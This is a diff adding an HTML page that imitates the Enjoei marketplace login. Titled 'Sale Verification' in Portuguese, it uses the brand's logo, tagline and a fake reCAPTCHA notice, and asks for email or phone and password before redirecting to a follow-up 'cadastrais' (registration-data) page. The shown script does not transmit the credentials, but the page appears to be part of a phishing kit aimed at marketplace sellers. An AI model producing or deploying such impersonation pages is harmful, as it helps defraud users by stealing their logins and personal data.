@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Venda</title>
+    <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+
+<body>
+    <header>
+        <div class="hd">
+            <a href="#"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-5esjB6m_LE1JcZfPMJpKj9V6iwZiFZSGiw&s" class="logo"> </a>
+        </div>
+    </header>
+    <div class="container1" id="login">
+        <h2 class="enjtxt">entrar no enjoei</h2>
+        <p class="enjtxt2">a casa é sua, se aprochegue.</p>
+        <input type="text" id="user" placeholder="EMAIL OU TELEFONE" required>
+        <input type="password" id="password" placeholder="SENHA" required>
+        <button onclick="login()">Entrar</button>
+        <p class="recaptcha">Protegido por reCAPTCHA <a href="#">privacidade</a> - <a href="#">condições</a></p>
+    </div>
+
+    <script>
+        function login() {
+            const user = document.getElementById('user').value;
+            const password = document.getElementById('password').value;
+
+            if (user === '' || password === '') {
+                alert('Por favor, preencha todos os campos.');
+                return;
+            }
+
+            window.location.href = 'cadastrais-popup.html';
+        }
+    </script>
+</body>
+
+</html>
